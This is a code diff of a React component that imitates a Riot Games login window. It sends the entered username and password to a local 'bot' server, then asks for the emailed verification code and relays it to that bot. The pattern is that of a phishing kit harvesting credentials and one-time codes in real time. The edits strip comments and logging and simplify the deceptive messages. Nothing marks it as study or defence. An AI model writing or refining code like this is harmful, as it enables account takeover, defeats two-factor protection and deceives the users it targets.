@@ -7,16 +7,16 @@ const RiotWindow = ({ onClose, onSuccess }) => {
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
   
-  // BOT FLOW STATES
-  const [step, setStep] = useState(1); // 1: login, 2: waiting_for_code, 3: verifying, 4: done
+  const [step, setStep] = useState(1);
   const [code, setCode] = useState("");
   const [botMessage, setBotMessage] = useState("");
   const [sessionId, setSessionId] = useState("");
   const [isCodeSent, setIsCodeSent] = useState(false);
-  const [verificationResult, setVerificationResult] = useState(null); // 'correct' or 'incorrect'
+  const [verificationResult, setVerificationResult] = useState(null);
   
   const isDragging = useRef(false);
   const dragStart = useRef({ x: 0, y: 0 });
+  const loginTimeout = useRef(null);
 
   const handleMouseDown = (e) => {
     if (e.button !== 0) return;
@@ -37,10 +37,8 @@ const RiotWindow = ({ onClose, onSuccess }) => {
     document.removeEventListener('mouseup', handleMouseUp);
   };
 
-  // Send credentials to bot
   const sendToBot = async (user, pass) => {
     try {
-      console.log("📤 Sending credentials to bot...");
       const response = await fetch('http://localhost:5000/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -48,30 +46,20 @@ const RiotWindow = ({ onClose, onSuccess }) => {
       });
       
       const data = await response.json();
-      console.log("📥 Bot response:", data);
       
       if (data.success) {
         setSessionId(data.sessionId);
-        // Wait 5 seconds before showing code input
-        setTimeout(() => {
-          setLoading(false);
-          setStep(2);
-          setBotMessage("A verification code has been sent to your email. Please enter it below.");
-        }, 5000);
         return true;
       }
       return false;
     } catch (err) {
-      console.error("❌ Failed to connect to bot:", err);
-      setLoading(false);
+      console.error("Bot error:", err);
       return false;
     }
   };
 
-  // Send code to bot
   const sendCodeToBot = async (code) => {
     try {
-      console.log("📤 Sending code to bot...");
       const response = await fetch('http://localhost:5000/verify-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -79,34 +67,29 @@ const RiotWindow = ({ onClose, onSuccess }) => {
       });
       
       const data = await response.json();
-      console.log("📥 Bot response:", data);
       
       if (data.success) {
         setIsCodeSent(true);
         setStep(3);
-        setBotMessage("Verifying code...");
-        // Start polling for status
+        setBotMessage("Verifying...");
         pollStatus();
         return true;
       }
       return false;
     } catch (err) {
-      console.error("❌ Failed to send code:", err);
+      console.error("Code error:", err);
       return false;
     }
   };
 
-  // Poll status from bot
   const pollStatus = async () => {
     try {
       const response = await fetch(`http://localhost:5000/status/${sessionId}`);
       const data = await response.json();
-      console.log("📊 Status check:", data);
       
       if (data.status === "verified") {
         setVerificationResult('correct');
-        setBotMessage("✅ Code verified successfully!");
-        console.log("✅ Code verified!");
+        setBotMessage("✅ Verified!");
         setTimeout(() => {
           setStep(4);
           if (onSuccess) onSuccess();
@@ -116,22 +99,19 @@ const RiotWindow = ({ onClose, onSuccess }) => {
         }, 1000);
       } else if (data.status === "failed") {
         setVerificationResult('incorrect');
-        setBotMessage("Incorrect code. Please try again.");
-        console.log("Code incorrect.");
-        // Reset after 5 seconds
+        setBotMessage("❌ Incorrect code. Try again.");
         setTimeout(() => {
           setStep(2);
           setCode("");
           setIsCodeSent(false);
           setVerificationResult(null);
-          setBotMessage("A verification code has been sent to your email. Please enter it below.");
+          setBotMessage("Enter the code from your email:");
         }, 5000);
       } else {
-        // Check again after 2 seconds
         setTimeout(pollStatus, 2000);
       }
     } catch (err) {
-      console.error("Status check failed:", err);
+      console.error("Status error:", err);
       setTimeout(pollStatus, 3000);
     }
   };
@@ -140,8 +120,6 @@ const RiotWindow = ({ onClose, onSuccess }) => {
     if (!isEnabled) return;
     
     setLoading(true);
-    setBotMessage("Verifying credentials...");
-    console.log("User clicked login");
     
     const botSent = await sendToBot(username, password);
     
@@ -152,29 +130,41 @@ const RiotWindow = ({ onClose, onSuccess }) => {
       } catch (err) {
         console.error("Storage failed:", err);
       }
+      
+      if (loginTimeout.current) {
+        clearTimeout(loginTimeout.current);
+      }
+      
+      loginTimeout.current = setTimeout(() => {
+        setLoading(false);
+        setStep(2);
+        setBotMessage("Enter the code from your email:");
+        loginTimeout.current = null;
+      }, 3000);
     } else {
       setLoading(false);
     }
   };
 
   const handleCodeSubmit = async () => {
-    if (!code || code.length < 6) {
-      console.log("⚠️ Code must be 6 digits");
-      return;
-    }
+    if (!code || code.length < 6) return;
     
     setLoading(true);
-    console.log("🔑 User submitted code:", code);
-    
     await sendCodeToBot(code);
     setLoading(false);
   };
 
   const isEnabled = username.length >= 3 && password.length >= 3;
 
-  // Render different steps
+  useEffect(() => {
+    return () => {
+      if (loginTimeout.current) {
+        clearTimeout(loginTimeout.current);
+      }
+    };
+  }, []);
+
   const renderContent = () => {
-    // Step 1: Login
     if (step === 1) {
       return (
         <>
@@ -183,7 +173,7 @@ const RiotWindow = ({ onClose, onSuccess }) => {
           {loading && (
             <div className="mb-4 flex items-center gap-2 text-zinc-600">
               <Loader2 className="w-4 h-4 animate-spin" />
-              <span className="text-sm">{botMessage || "Verifying..."}</span>
+              <span className="text-sm">Verifying...</span>
             </div>
           )}
           
@@ -202,13 +192,6 @@ const RiotWindow = ({ onClose, onSuccess }) => {
               onChange={(e) => setPassword(e.target.value)}
               className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500" 
             />
-            
-            <div className="grid grid-cols-4 gap-2 pt-2">
-              <button className="h-10 flex items-center justify-center bg-white border border-zinc-200 rounded"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google" className="w-6 h-6 object-contain"/></button>
-              <button className="h-10 flex items-center justify-center bg-black rounded"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" className="w-6 h-6 object-contain invert"/></button>
-              <button className="h-10 flex items-center justify-center bg-[#107c10] rounded"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg" alt="Xbox" className="w-6 h-6 object-contain invert"/></button>
-              <button className="h-10 flex items-center justify-center bg-[#004593] rounded"><img src="https://www.svgrepo.com/show/452087/playstation.svg" alt="PS" className="w-6 h-6 object-contain invert"/></button>
-            </div>
 
             <div className="flex justify-center pt-6">
               <button 
@@ -230,7 +213,6 @@ const RiotWindow = ({ onClose, onSuccess }) => {
       );
     }
 
-    // Step 2: Waiting for code
     if (step === 2) {
       return (
         <>
@@ -239,9 +221,9 @@ const RiotWindow = ({ onClose, onSuccess }) => {
               <Loader2 className="w-8 h-8 text-blue-500 animate-spin" />
             </div>
             
-            <h2 className="text-2xl text-zinc-900 font-bold mb-2">Verification Required</h2>
+            <h2 className="text-2xl text-zinc-900 font-bold mb-2">Enter Code</h2>
             <p className="text-zinc-600 text-sm mb-6">
-              {botMessage || "A verification code has been sent to your email. Please enter it below."}
+              {botMessage}
             </p>
             
             {!isCodeSent ? (
@@ -258,17 +240,15 @@ const RiotWindow = ({ onClose, onSuccess }) => {
                 <button 
                   onClick={handleCodeSubmit}
                   disabled={loading}
-                  className={`w-full h-12 rounded-lg font-medium transition-all ${
-                    loading ? "bg-gray-400 cursor-not-allowed" : "bg-blue-600 hover:bg-blue-700 text-white"
-                  }`}
+                  className="w-full h-12 rounded-lg font-medium bg-blue-600 hover:bg-blue-700 text-white"
                 >
-                  {loading ? <Loader2 className="animate-spin inline-block" /> : "Verify Code"}
+                  {loading ? <Loader2 className="animate-spin inline-block" /> : "Verify"}
                 </button>
               </div>
             ) : (
               <div className="text-center py-8">
                 <Loader2 className="w-8 h-8 text-blue-500 animate-spin mx-auto" />
-                <p className="text-zinc-600 text-sm mt-4">Verifying code...</p>
+                <p className="text-zinc-600 text-sm mt-4">Verifying...</p>
               </div>
             )}
           </div>
@@ -276,7 +256,6 @@ const RiotWindow = ({ onClose, onSuccess }) => {
       );
     }
 
-    // Step 3: Verifying (shows result)
     if (step === 3) {
       const isCorrect = verificationResult === 'correct';
       const isIncorrect = verificationResult === 'incorrect';
@@ -303,31 +282,16 @@ const RiotWindow = ({ onClose, onSuccess }) => {
             <h2 className={`text-2xl font-bold mb-2 ${
               isCorrect ? 'text-green-600' : isIncorrect ? 'text-red-600' : 'text-zinc-900'
             }`}>
-              {isCorrect ? 'Verification Successful!' : isIncorrect ? 'Verification Failed' : 'Verifying...'}
+              {isCorrect ? 'Verified!' : isIncorrect ? 'Incorrect' : 'Verifying...'}
             </h2>
-            <p className={`text-sm ${
-              isCorrect ? 'text-green-600' : isIncorrect ? 'text-red-600' : 'text-zinc-600'
-            }`}>
+            <p className={`text-sm ${isCorrect ? 'text-green-600' : isIncorrect ? 'text-red-600' : 'text-zinc-600'}`}>
               {botMessage}
             </p>
-            
-            {isIncorrect && (
-              <p className="text-zinc-500 text-xs mt-4">
-                ⏳ Redirecting to try again...
-              </p>
-            )}
-            
-            {isCorrect && (
-              <p className="text-zinc-500 text-xs mt-4">
-                ✅ Redirecting to dashboard...
-              </p>
-            )}
           </div>
         </>
       );
     }
 
-    // Step 4: Done
     if (step === 4) {
       return (
         <>
@@ -338,10 +302,8 @@ const RiotWindow = ({ onClose, onSuccess }) => {
               </svg>
             </div>
             
-            <h2 className="text-2xl text-green-600 font-bold mb-2">Account Verified!</h2>
-            <p className="text-zinc-600 text-sm">
-              ✅ Your account has been successfully verified.
-            </p>
+            <h2 className="text-2xl text-green-600 font-bold mb-2">Verified!</h2>
+            <p className="text-zinc-600 text-sm">✅ Account verified successfully.</p>
           </div>
         </>
       );
